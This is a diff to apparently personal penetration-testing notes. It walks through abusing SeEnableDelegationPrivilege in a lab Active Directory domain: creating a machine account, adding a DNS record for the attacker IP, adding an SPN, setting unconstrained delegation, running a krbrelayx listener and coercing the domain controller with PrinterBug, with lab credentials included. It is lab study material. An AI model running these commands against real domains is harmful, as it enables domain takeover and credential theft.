@@ -1232,29 +1232,30 @@ impacket-dpapi credential -file "/path/to/file/locally/master2" -key '0xd9a57072
 [[delegation]]
 === SeEnableDelegationPrivilege
 
-Attack flow 
+1.Attack flow 
 
-Create computer account
+2.Create computer account
 
-Add DNS record
+3.Add DNS record
 
-Add SPN
+4.Add SPN
 
-Enable delegation
+5.Enable delegation
 
-Trigger authentication
+6.Trigger authentication
 
-Capture ticket
+7.Capture ticket
 
-Dump NTDS
+8.Dump NTDS
 
-Create a computer 
+
+Create a computer using a `MachineAccountQuota`
 
 ```bash
 addcomputer.py -computer-name colosion -computer-pass colosion -dc-ip 10.129.5.144 delegate.vl/N.Thompson:'KALEB_2341'
 ```
 
-Add a DNS for ticket phishing 
+Map hostname to attacker IP so DC connects to us
 
 ```bash
 dnstool -u 'delegate.vl\colosion$' -p 'colosion' --action add --record colosion.delegate.vl --data 10.10.14.89 --type A -dns-ip 10.129.5.144  dc1.delegate.vl
@@ -1266,19 +1267,19 @@ Validate a DNS
 dig @10.129.5.144 colosion.delegate.vl +noall +answer
 ```
 
-Add spn to created computer. If there is a issues trying a `additional` flag
+Add spn to created computer. If there is a issues trying a `additional` flag. Add service so Kerberos tickets can be requested
 
 ```bash
 addspn -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/colosion.delegate.vl' -t 'colosion$' -dc-ip 10.129.5.144 dc1.delegate.vl 
 ```
 
-Set a flag `TRUSTED_FOR_DELEGATION` for created computer
+Set unconstrained delegation on the computer
 
 ```bash
 bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'colosion$' -f TRUSTED_FOR_DELEGATION
 ```
 
-Check if target is vulnerable for triggering
+Verify target can be forced to authenticate
 
 ```bash
 nxc smb dc1.delegate.vl -u 'colosion$' -k   -M coerce_plus
@@ -1290,13 +1291,13 @@ Before setting a `Krbrelayx` listener we must create a `NTLM` hash for computer 
 pypykatz crypto nt 'colosion'
 ```
 
-Set a `Krbrelayx` listener. Hash is taken from `pypykatz`
+Set a `Krbrelayx` listener. Hash is taken from `pypykatz`. Wait for incoming Kerberos authentication
 
 ```bash
 krbrelayx -hashes :49738a5a7c6ccc06392d9af633139895
 ```
 
-Trigger `DC` to authorize to our created computer
+Force DC to authenticate to our fake host
 
 ```bash
 nxc smb dc1.delegate.vl -u 'colosion$' -k  -M coerce_plus -o LISTENER=colosion.delegate.vl METHOD=PrinterBug
